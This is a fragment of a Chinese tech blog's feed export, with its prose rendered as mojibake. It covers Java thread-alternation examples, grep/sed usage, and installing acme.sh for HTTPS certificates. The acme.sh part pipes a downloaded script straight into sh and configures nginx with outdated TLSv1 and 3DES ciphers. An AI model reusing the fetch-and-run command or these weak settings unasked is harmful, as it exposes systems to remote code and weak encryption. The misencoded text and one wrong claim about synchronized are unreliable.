&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                lock.unlock();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,<span class="string">&quot;LETTER&quot;</span>).start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">            lock.lock();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">for</span> (Integer num : NUMBER)&#123;</span><br><span class="line">                    <span class="comment">// æ‰“å°æ•°å­—</span></span><br><span class="line">                    System.out.print(num);</span><br><span class="line">                    <span class="comment">// é€šçŸ¥å­—æ¯çº¿ç¨‹è¿è¡Œ</span></span><br><span class="line">                    letterCondition.signal();</span><br><span class="line">                    <span class="comment">// æœ¬çº¿ç¨‹ç­‰å¾…</span></span><br><span class="line">                    numberCondition.await();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// ä¿è¯çº¿ç¨‹æ­£å¸¸å…³é—­</span></span><br><span class="line">                letterCondition.signal();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                lock.unlock();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,<span class="string">&quot;NUMBER&quot;</span>).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="volatileæ–¹å¼"><a href="#volatileæ–¹å¼" class="headerlink" title="volatileæ–¹å¼"></a>volatileæ–¹å¼</h5><p>volatileå…³é”®å­—ä¿è¯äº†ä¸åŒçº¿ç¨‹ï¼Œå¯¹å˜é‡è¿›è¡Œæ“ä½œçš„å¯è§æ€§ï¼Œä»¥åŠè¯»å’Œå†™çš„åŸå­æ€§ï¼Œè€Œä¸”å®ƒç¦æ­¢æŒ‡ä»¤é‡æ’ï¼Œæ‰€ä»¥å®ƒè¿˜å…·å¤‡æœ‰åºæ€§ã€‚</p>
<p>å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ªå…³é”®å­—ç‰¹æ€§ï¼Œèƒ½å¤Ÿè½»æ˜“çš„å®Œæˆä»¥ä¸Šæ¡ˆä¾‹çš„è¦æ±‚ã€‚</p>
<p>æ¼”ç¤ºæ¡ˆä¾‹å®ç°ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">VolatileTest</span> </span>&#123;</span><br><span class="line">    <span class="comment">// å®šä¹‰flagï¼Œ=1 è¿è¡Œæ•°å­—çº¿ç¨‹ï¼Œ=2 è¿è¡Œå­—æ¯çº¿ç¨‹ï¼Œä¼˜å…ˆæ‰“å°æ•°å­—ï¼Œåˆå§‹è®¾ç½®ä¸º1ï¼Œ</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> <span class="keyword">int</span> flag = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] LETTER = <span class="keyword">new</span> String[]&#123;<span class="string">&quot;A&quot;</span>,<span class="string">&quot;B&quot;</span>,<span class="string">&quot;C&quot;</span>,<span class="string">&quot;D&quot;</span>&#125;;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Integer[] NUMBER = <span class="keyword">new</span> Integer[]&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">for</span> (String str : LETTER)&#123;</span><br><span class="line">                <span class="comment">// å½“flag=2çš„æ—¶å€™æ‰æ‰“å°å­—æ¯</span></span><br><span class="line">                <span class="keyword">while</span> (flag != <span class="number">2</span>)&#123;&#125;</span><br><span class="line">                <span class="comment">// æ‰“å°</span></span><br><span class="line">                System.out.print(str);</span><br><span class="line">                <span class="comment">// è®¾ç½®flagä¸º1ï¼Œæ•°å­—</span></span><br><span class="line">                flag = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,<span class="string">&quot;LETTER&quot;</span>).start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">for</span> (Integer num : NUMBER)&#123;</span><br><span class="line">                <span class="comment">// å½“flag=1çš„æ—¶å€™æ‰æ‰“å°æ•°å­—</span></span><br><span class="line">                <span class="keyword">while</span> (flag != <span class="number">1</span>)&#123;&#125;</span><br><span class="line">                <span class="comment">// æ‰“å°</span></span><br><span class="line">                System.out.print(num);</span><br><span class="line">                <span class="comment">// è®¾ç½®flagä¸º1ï¼Œå­—æ¯</span></span><br><span class="line">                flag = <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,<span class="string">&quot;NUMBER&quot;</span>).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="AtomicIntegeræ–¹å¼"><a href="#AtomicIntegeræ–¹å¼" class="headerlink" title="AtomicIntegeræ–¹å¼"></a>AtomicIntegeræ–¹å¼</h5><p>æˆ‘ä»¬éƒ½çŸ¥é“javaå¹¶å‘æœºåˆ¶ä¸­ä¸»è¦æœ‰ä¸‰ä¸ªç‰¹æ€§éœ€è¦æˆ‘ä»¬å»è€ƒè™‘ï¼šåŸå­æ€§ã€å¯è§æ€§å’Œæœ‰åºæ€§ã€‚</p>
<p>synchronizedå…³é”®å­—å¯ä»¥ä¿è¯å¯è§æ€§å’Œæœ‰åºæ€§å´æ— æ³•ä¿è¯åŸå­æ€§ï¼Œè€ŒAtomicIntegerçš„ä½œç”¨å°±æ˜¯ä¸ºäº†ä¿è¯åŸå­æ€§ã€‚</p>
<p>é€šè¿‡å®ƒçš„åŸå­æ€§ï¼Œæˆ‘ä»¬å¯ä»¥åƒvolatileä¸€æ ·ï¼Œè½»æ˜“çš„å®Œæˆæ¡ˆä¾‹æƒ³è¦çš„æ•ˆæœï¼Œ</p>
<p>æ¼”ç¤ºæ¡ˆä¾‹å®ç°ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AtomicIntegerTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å®šä¹‰AtomicInteger flagï¼Œ=1 è¿è¡Œæ•°å­—çº¿ç¨‹ï¼Œ=2 è¿è¡Œå­—æ¯çº¿ç¨‹ï¼Œä¼˜å…ˆæ‰“å°æ•°å­—ï¼Œåˆå§‹è®¾ç½®ä¸º1ï¼Œ</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> AtomicInteger flag = <span class="keyword">new</span> AtomicInteger(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] LETTER = <span class="keyword">new</span> String[]&#123;<span class="string">&quot;A&quot;</span>,<span class="string">&quot;B&quot;</span>,<span class="string">&quot;C&quot;</span>,<span class="string">&quot;D&quot;</span>&#125;;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Integer[] NUMBER = <span class="keyword">new</span> Integer[]&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">for</span> (String str : LETTER)&#123;</span><br><span class="line">                <span class="comment">// å½“flag=2çš„æ—¶å€™æ‰æ‰“å°å­—æ¯</span></span><br><span class="line">                <span class="keyword">while</span> (flag.get() != <span class="number">2</span>)&#123;&#125;</span><br><span class="line">                <span class="comment">// æ‰“å°</span></span><br><span class="line">                System.out.print(str);</span><br><span class="line">                <span class="comment">// è®¾ç½®flagä¸º1ï¼Œæ•°å­—</span></span><br><span class="line">                flag.set(<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,<span class="string">&quot;LETTER&quot;</span>).start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">for</span> (Integer num : NUMBER)&#123;</span><br><span class="line">                <span class="comment">// å½“flag=1çš„æ—¶å€™æ‰æ‰“å°æ•°å­—</span></span><br><span class="line">                <span class="keyword">while</span> (flag.get() != <span class="number">1</span>)&#123;&#125;</span><br><span class="line">                <span class="comment">// æ‰“å°</span></span><br><span class="line">                System.out.print(num);</span><br><span class="line">                <span class="comment">// è®¾ç½®flagä¸º2ï¼Œå­—æ¯</span></span><br><span class="line">                flag.set(<span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,<span class="string">&quot;NUMBER&quot;</span>).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>java</category>
        <category>çº¿ç¨‹</category>
      </categories>
      <tags>
        <tag>çº¿ç¨‹é€šè®¯</tag>
        <tag>synchronized</tag>
        <tag>notify</tag>
        <tag>wait</tag>
        <tag>volatile</tag>
        <tag>LockSupport</tag>
      </tags>
  </entry>
  <entry>
    <title>grepä¸catã€sedçš„ç»“åˆ</title>
    <url>/2020/06/20/shell-grep-cat-sed/</url>
    <content><![CDATA[<h4 id="grepæŸ¥æ‰¾å‘½ä»¤"><a href="#grepæŸ¥æ‰¾å‘½ä»¤" class="headerlink" title="grepæŸ¥æ‰¾å‘½ä»¤"></a>grepæŸ¥æ‰¾å‘½ä»¤</h4><p>grepå‘½ä»¤æ˜¯linuxç³»ç»Ÿä¸­ï¼Œæœ€å¸¸ç”¨çš„æ–‡ä»¶å­—ç¬¦ä¸²æŸ¥æ‰¾å‘½ä»¤ï¼ŒèŒä¸šç”Ÿæ¶¯ä¸­ï¼Œæˆ‘ä»¬å‡ ä¹ç¦»ä¸å¼€å®ƒã€‚</p>
<p>ä¸‹é¢æ˜¯å®ƒæœ€ç®€å•çš„ç”¨æ³•ï¼Œä¸è¿‡å®é™…æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬é€šå¸¸ä¼šæ·»åŠ å¾ˆå¤šå‚æ•°æˆ–ç»“åˆå…¶ä»–çš„å‘½ä»¤å»è¿›è¡Œä½¿ç”¨ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">grep &quot;&lt;pattern&gt;&quot; &lt;fileName&gt;</span><br></pre></td></tr></table></figure>
<p>å¸¸ç”¨å‘½ä»¤å‚æ•°ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;fileName&gt;: æ–‡ä»¶åç§°ï¼Œå¤šä¸ªæ–‡ä»¶ä½¿ç”¨ç©ºæ ¼éš”å¼€</span><br><span class="line">&lt;pattern&gt;: åŒ¹é…å­—ç¬¦</span><br><span class="line">-n : æ˜¾ç¤ºè¡Œå·</span><br><span class="line">-i : å¿½ç•¥å­—ç¬¦å¤§å°å†™</span><br><span class="line">-l : åˆ—å‡ºç¬¦åˆæ¡ä»¶çš„æ–‡ä»¶å</span><br><span class="line">-r : æŸ¥æ‰¾æ‰€æœ‰å­ç›®å½•</span><br><span class="line">-w : åªæ˜¾ç¤ºæ•´è¡Œå…¨åŒ¹é…</span><br><span class="line">-o : åªæ˜¾ç¤ºåŒ¹é…çš„å…³é”®å­—éƒ¨åˆ†</span><br><span class="line">-A &lt;num&gt;: å…³é”®å­—æ‰€åœ¨è¡Œã€ä»¥åŠä¹‹ånumè¡Œ</span><br><span class="line">-B &lt;num&gt;: å…³é”®å­—æ‰€åœ¨è¡Œã€ä»¥åŠä¹‹å‰numè¡Œ</span><br><span class="line">-C &lt;num&gt;: å…³é”®å­—æ‰€åœ¨è¡Œã€ä»¥åŠå‰ånumè¡Œ</span><br><span class="line">â€“include&#x3D;&quot;*.txt&quot;: ä»…æŸ¥æ‰¾æŒ‡å®šåç¼€çš„æ–‡ä»¶</span><br><span class="line">&gt; file: å°†æŸ¥è¯¢ç»“æœä¿å­˜åˆ°æ–‡ä»¶ä¸­</span><br><span class="line">&gt;&gt; file: å°†æŸ¥è¯¢ç»“æœè¿½åŠ åˆ°æ–‡ä»¶ä¸­</span><br></pre></td></tr></table></figure>
<p>å¦‚ï¼ŒæŸ¥è¯¢å“ªäº›æ–‡ä»¶ä¸­åŒ…å«â€œokâ€ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep <span class="string">&quot;ok&quot;</span> -r -l --include=<span class="string">&quot;*&quot;</span> ./</span><br></pre></td></tr></table></figure>

<h4 id="grepå’Œcat-tailçš„ç»“åˆ"><a href="#grepå’Œcat-tailçš„ç»“åˆ" class="headerlink" title="grepå’Œcat/tailçš„ç»“åˆ"></a>grepå’Œcat/tailçš„ç»“åˆ</h4><p>é€šè¿‡grepå’Œcat/tailçš„ç»“åˆï¼Œæˆ‘ä»¬å¯ä»¥è½»æ˜“çš„å®ç°è¿”å›æ–‡ä»¶ä¸­çš„å…³é”®å­—æ‰€åœ¨è¡Œã€ä»¥åŠé™„è¿‘æŒ‡å®šè¡Œçš„å†…å®¹ï¼Œå°¤å…¶æ˜¯åœ¨æˆ‘ä»¬æŸ¥è¯¢ç¨‹åºæ—¥å¿—çš„æ—¶å€™ï¼Œç”¨çš„éå¸¸å¤šã€‚</p>
<p>è¯­æ³•ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &lt;fileName&gt; | grep &lt;pattern&gt; &lt;cmd&gt;</span><br><span class="line">æˆ–</span><br><span class="line">tail -f &lt;fileName&gt; | grep &lt;pattern&gt; &lt;cmd&gt;</span><br></pre></td></tr></table></figure>
<p>å‚æ•°è¯´æ˜ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;fileName&gt;ï¼šæ–‡ä»¶åç§°ï¼Œå¤šä¸ªæ–‡ä»¶ä½¿ç”¨ç©ºæ ¼éš”å¼€</span><br><span class="line">&lt;pattern&gt;ï¼šåŒ¹é…å­—ç¬¦</span><br><span class="line">&lt;cmd&gt;ï¼šgrepå‘½ä»¤å‚æ•°</span><br></pre></td></tr></table></figure>
<p>catç»“åˆç¤ºä¾‹ï¼šåœ¨æ–‡ä»¶default.logä¸­æŸ¥æ‰¾â€œå¼‚å¸¸â€ï¼Œå¹¶æ”¶é›†å‰å10è¡Œè®°å½•</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat default.log | grep <span class="string">&quot;å¼‚å¸¸&quot;</span> -C 10</span><br></pre></td></tr></table></figure>
<p>tailç»“åˆç¤ºä¾‹ï¼šåœ¨æ–‡ä»¶default.logä¸­æŸ¥æ‰¾â€œå¼‚å¸¸â€ï¼Œå¹¶è¿›è¡Œå®æ—¶æ”¶é›†</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tail -f default.log | grep <span class="string">&quot;å¼‚å¸¸&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="grepå’Œsedçš„ç»“åˆ"><a href="#grepå’Œsedçš„ç»“åˆ" class="headerlink" title="grepå’Œsedçš„ç»“åˆ"></a>grepå’Œsedçš„ç»“åˆ</h4><p>sedå‘½ä»¤æ˜¯ç”¨æ¥ç¼–è¾‘ä¸€ä¸ªæˆ–å¤šä¸ªæ–‡ä»¶ã€ç®€åŒ–å¯¹æ–‡ä»¶åå¤æ“ä½œçš„ç¥å™¨ï¼Œå®ƒå’Œgrepçš„ç»“åˆä»¤æˆ‘ä»¬çš„æ–‡ä»¶æ“ä½œèµ·æ¥æ›´åŠ çš„å¾—å¿ƒåº”æ‰‹ã€‚<br>æˆ‘ä»¬ä¸‹é¢å°±æ¥çœ‹çœ‹ï¼Œå®ƒèƒ½ç»™æˆ‘ä»¬å¸¦æ¥æ€æ ·çš„ä½“éªŒã€‚</p>
<p>sedè¯­æ³•ä»‹ç»:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sed &lt;å‘½ä»¤å‚æ•°&gt; &lt;åŠ¨ä½œ&gt; &lt;æ–‡ä»¶&gt;</span><br></pre></td></tr></table></figure>
<p>å¸¸ç”¨å‘½ä»¤å‚æ•°ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-i: ç›´æ¥ä¿®æ”¹é…åˆçš„æ–‡ä»¶å†…å®¹</span><br><span class="line">-e: ä¸ä¿®æ”¹åŸæ–‡ä»¶ï¼Œä»…è¾“å‡ºï¼Œé€šå¸¸å¯ä»¥å’Œâ€œ&gt;æˆ–&gt;&gt;â€å‘½ä»¤ç»“åˆï¼Œè¾“å‡ºåˆ°æ–°æ–‡ä»¶ä¸­</span><br></pre></td></tr></table></figure>

<p>å¸¸ç”¨åŠ¨ä½œè¯´æ˜ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s: æ›¿æ¢å­—ç¬¦ï¼Œæ›¿æ¢æŒ‡å®šçš„å­—ç¬¦ä¸²ï¼Œå¦‚ï¼šsed -i &#39;s&#x2F;åŒ¹é…å­—ç¬¦&#x2F;æ–°å­—ç¬¦&#x2F;g&#39; a.txtï¼Œæœ«å°¾çš„&#x2F;gè¡¨ç¤ºæ›¿æ¢æ‰€æœ‰åŒ¹é…çš„å­—ç¬¦</span><br><span class="line">a: æ–°å¢è¡Œï¼Œåœ¨æŒ‡å®šè¡Œæˆ–æŒ‡å®šèŒƒå›´çš„è¡Œçš„ä¸‹ä¸€è¡Œæ–°å¢å†…å®¹ï¼Œå¦‚ï¼š sed -i &#39;2a\bbb&#39; a.txt</span><br><span class="line">i: æ–°å¢è¡Œï¼Œåœ¨æŒ‡å®šè¡Œæˆ–æŒ‡å®šèŒƒå›´çš„è¡Œçš„ä¸Šä¸€è¡Œæ–°å¢å†…å®¹ï¼Œå¦‚ï¼š sed -i &#39;2i\bbb&#39; a.txt</span><br><span class="line">c: æ›¿æ¢è¡Œï¼Œæ›¿æ¢æŒ‡å®šè¡Œæˆ–æŒ‡å®šèŒƒå›´çš„è¡Œçš„å†…å®¹ï¼Œå¦‚ï¼šsed -i &#39;3,5c\replacestr&#39; a.txt</span><br><span class="line">d: åˆ é™¤è¡Œï¼Œåˆ é™¤æŒ‡å®šè¡Œæˆ–æŒ‡å®šèŒƒå›´çš„è¡Œï¼Œå¦‚ï¼š sed -i &#39;3d&#39; a.txt </span><br></pre></td></tr></table></figure>
<p>æ³¨: åŠ¨ä½œå‰é¢çš„æ•°å­—è¡¨ç¤ºç¬¬å‡ å·ï¼Œæˆ–è€…å‡ è¡Œåˆ°å‡ è¡Œ</p>
<p>æ‰©å±•æ¡ˆä¾‹ï¼š<br>æŸ¥æ‰¾æŸä¸ªæ–‡ä»¶ä¸­çš„å…³é”®å­—ï¼Œå¹¶åœ¨å…¶ä¸‹æ–°å¢ä¸€è¡Œæ•°æ®</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sed -i <span class="string">&#x27;/å…³é”®å­—/a\æ–°å¢çš„ä¸€è¡Œæ•°æ®&#x27;</span> a.txt</span><br></pre></td></tr></table></figure>

<p>grepä¸sedå‘½ä»¤ç»“åˆçš„ç¤ºä¾‹:</p>
<p>ä¸Šé¢æˆ‘ä»¬å·²ç»äº†è§£sedå‘½ä»¤çš„ç‰¹æ€§ï¼Œé‚£æˆ‘ä»¬ç°åœ¨å°±è¯•è¯•ï¼Œå®ƒå’Œgrepå‘½ä»¤çš„ç»“åˆï¼Œç©¶ç«Ÿèƒ½æ’å‡ºæ€æ ·çš„ç«èŠ±ï¼Ÿ</p>
<p>ä¸‹é¢çš„å‘½ä»¤å®ç°çš„æ˜¯ï¼šå°†æŸä¸ªç›®å½•ä»¥åŠå­ç›®å½•çš„æ‰€æœ‰æ–‡ä»¶ä¸­çš„å…³é”®å­—â€œokâ€ç»Ÿä¸€æ›¿æ¢ä¸ºâ€œyesâ€</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sed -i <span class="string">&#x27;s/ok/yes/g&#x27;</span> `grep <span class="string">&quot;ok&quot;</span> -r -l --include=<span class="string">&quot;*&quot;</span> ./`</span><br></pre></td></tr></table></figure>
<p>ä¸Šé¢ `` æ‹¬èµ·æ¥çš„grepå‘½ä»¤ï¼Œè¡¨ç¤ºå°†grepå‘½ä»¤æŸ¥è¯¢çš„ç»“æœä½œä¸ºæ“ä½œæ–‡ä»¶ã€‚</p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>æŸ¥æ‰¾å…³é”®å­—</tag>
        <tag>å…³é”®å­—æ›¿æ¢</tag>
      </tags>
  </entry>
  <entry>
    <title>ä½¿ç”¨acme.shç®¡ç†httpsè¯ä¹¦</title>
    <url>/2020/07/17/shell-https-acme-sh/</url>
    <content><![CDATA[<h4 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;æœ€è¿‘åœ¨githubä¸Šå‘ç°ä¸€ä¸ªé¡¹ç›®â€acme.shâ€œï¼Œç›¸å½“å¼ºå¤§ï¼Œå®ƒå®ç°äº† acme åè®®, å¯ä»¥ä» letsencrypt ç”Ÿæˆå…è´¹è¯ä¹¦ï¼Œå¹¶è‡ªåŠ¨æ›´æ–°è¯ä¹¦ï¼Œè§£å†³äº†è¯ä¹¦ç”³è¯·å’Œæ›´æ¢çš„ç—›ç‚¹ã€‚</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;å°±è¿™ä¸€ç‚¹ï¼Œå°±å·²ç»ä½“ç°äº†è¿™ä¸ªé¡¹ç›®çš„ä»·å€¼äº†ï¼Œç»™ä½œè€…èµä¸€ä¸ªã€‚è€Œæˆ‘ä¹Ÿæ˜¯httpsè¯ä¹¦ç”³è¯·æ›¿æ¢çš„æ·±åº¦å—å®³è€…ï¼Œçœ‹åˆ°è¿™ä¸ªé¡¹ç›®åï¼Œç«‹åˆ»ç€æ‰‹å®è·µäº†ä¸€æŠŠï¼Œåˆ«è¯´ï¼Œè¿™æ•ˆæœè¿˜çœŸä¸é”™ã€‚</p>
<p>githubåœ°å€ï¼š<a href="https://github.com/acmesh-official/acme.sh">é“¾æ¥åœ°å€</a></p>
<h4 id="acme-shå®‰è£…"><a href="#acme-shå®‰è£…" class="headerlink" title="acme.shå®‰è£…"></a>acme.shå®‰è£…</h4><p>å®‰è£…å¾ˆå®¹æ˜“ï¼Œåªéœ€è¦ä¸€ä¸ªç®€å•çš„å‘½ä»¤ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl  https://get.acme.sh | sh</span><br></pre></td></tr></table></figure>
<p>è®¾ç½®åˆ«åï¼Œæ–¹ä¾¿åé¢ç›´æ¥è°ƒç”¨ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">alias</span> acme.sh=~/.acme.sh/acme.sh</span><br></pre></td></tr></table></figure>
<p>å®‰è£…å®Œæˆåï¼Œä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ªcronjobï¼Œæ¯å¤© 0:00 ç‚¹è‡ªåŠ¨æ£€æµ‹æ‰€æœ‰çš„è¯ä¹¦ï¼Œå¦‚æœå¿«è¿‡æœŸäº†ï¼Œå°±ä¼šè‡ªåŠ¨æ›´æ–°è¯ä¹¦ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸‹é¢çš„å‘½ä»¤æŸ¥çœ‹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">crontab -l</span><br></pre></td></tr></table></figure>

<h4 id="nginxé…ç½®é™æ€ç½‘é¡µ"><a href="#nginxé…ç½®é™æ€ç½‘é¡µ" class="headerlink" title="nginxé…ç½®é™æ€ç½‘é¡µ"></a>nginxé…ç½®é™æ€ç½‘é¡µ</h4><p>1ï¼Œåˆ›å»ºnginxè¯ä¹¦ï¼ŒæŒ‡å®šéœ€è¦ç”Ÿæˆè¯ä¹¦çš„åŸŸå</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">acme.sh --issue  -d u.32e.co   --nginx</span><br></pre></td></tr></table></figure>
<p>æ³¨ï¼šä¸Šé¢è¿™ä¸ªå‘½ä»¤æ‰§è¡Œä¹‹å‰ï¼Œéœ€è¦å…ˆå°†nginxçš„åŸŸåé…ç½®å¥½ï¼Œå¦åˆ™ä¼šæç¤ºé”™è¯¯ï¼šâ€œCan not find conf file for domain u.32e.coâ€ï¼Œç¤ºä¾‹å¯å‚è€ƒæ–‡æœ«â€œç”³è¯·é…ç½®ç¤ºä¾‹â€</p>
<p>2ï¼Œè®¾ç½®è¯ä¹¦å­˜æ”¾è·¯å¾„</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkdir -p /home/cert/u.32e.co</span><br></pre></td></tr></table></figure>
<p>3ï¼Œå°†ç”Ÿæˆçš„è¯ä¹¦å®‰è£…åˆ°æŒ‡å®šè·¯å¾„ï¼Œå¹¶è®¾ç½®è‡ªåŠ¨æ›´æ–°</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">acme.sh --install-cert -d u.32e.co \</span><br><span class="line">--key-file       /home/cert/u.32e.co/key.pem  \</span><br><span class="line">--fullchain-file /home/cert/u.32e.co/cert.pem \</span><br><span class="line">--reloadcmd     <span class="string">&quot;nginx -s reload&quot;</span></span><br></pre></td></tr></table></figure>
<p>æ³¨ï¼šè¿™é‡Œæ–‡æ¡£å€’æ˜¯è¯´è¦ä½¿ç”¨ï¼šâ€œforce-reloadâ€ï¼Œæ‰èƒ½æ­£å¸¸æ›´æ–°åŠ è½½ã€‚ä¸è¿‡è²Œä¼¼ç›´æ¥reloadä¹Ÿèƒ½é‡æ–°åŠ è½½ï¼Œå®åœ¨ä¸è¡Œç”šè‡³å¯ä»¥ç›´æ¥æ‹¼æ¥å‘½ä»¤ï¼šâ€œnginx -s stop;nginxâ€</p>
<p>4ï¼Œè¯ä¹¦å’Œè‡ªåŠ¨æ›´æ–°å·²ç»è®¾ç½®å¥½åï¼Œæˆ‘ä»¬å°±å¼€å§‹é…ç½®ngixï¼Œå¼€æ”¾443ç«¯å£ã€è®¾ç½®è¯ä¹¦è·¯å¾„å’Œå…¶ä»–å‚æ•°</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line">        listen       443 ssl http2; </span><br><span class="line">        server_name  u.32e.co;</span><br><span class="line"></span><br><span class="line">        <span class="comment">#å¦‚æœæ‰“å¼€ï¼Œåˆ™é»˜è®¤å…¨éƒ¨èµ°https</span></span><br><span class="line">        <span class="comment">#ssl on;   </span></span><br><span class="line">        ssl_certificate   /home/cert/u.32e.co/cert.pem;</span><br><span class="line">        ssl_certificate_key  /home/cert/u.32e.co/key.pem;</span><br><span class="line">   </span><br><span class="line">        <span class="comment">#sslæ€§èƒ½è°ƒä¼˜</span></span><br><span class="line">        ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3;</span><br><span class="line">        ssl_ciphers EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5;</span><br><span class="line">        ssl_prefer_server_ciphers on;</span><br><span class="line">        ssl_session_timeout 10m;</span><br><span class="line">        ssl_session_cache <span class="built_in">builtin</span>:1000 shared:SSL:10m;</span><br><span class="line">        ssl_stapling on;</span><br><span class="line">        ssl_stapling_verify on;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># å¼€å¯gzipå‹ç¼©</span></span><br><span class="line">        gzip on;</span><br><span class="line">        <span class="comment"># è®¾ç½®ä¸­æ–‡ç¼–ç </span></span><br><span class="line">        charset utf-8,gbk;</span><br><span class="line"></span><br><span class="line">        location / &#123;</span><br><span class="line">            root   /home/www_utils;</span><br><span class="line">            index  index.html index.htm;</span><br><span class="line">        &#125;</span><br><span class="line">        error_page   500 502 503 504  /50x.html;</span><br><span class="line">        location = /50x.html &#123;</span><br><span class="line">            root   html;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h4 id="nginxé…ç½®åŠ¨æ€æœåŠ¡"><a href="#nginxé…ç½®åŠ¨æ€æœåŠ¡" class="headerlink" title="nginxé…ç½®åŠ¨æ€æœåŠ¡"></a>nginxé…ç½®åŠ¨æ€æœåŠ¡</h4><p>1ï¼Œæˆ‘è¿™é‡Œä½¿ç”¨æ˜¯javaçš„springbooté¡¹ç›®ï¼Œç«¯å£ï¼š8080ã€‚åˆ›å»ºè¯ä¹¦çš„æ–¹æ³•éƒ½æ˜¯ä¸€æ ·çš„ï¼Œæˆ‘ä»¬ç›´æ¥çœ‹nginxè¦å¦‚ä½•é…ç½®çš„ï¼š</p>
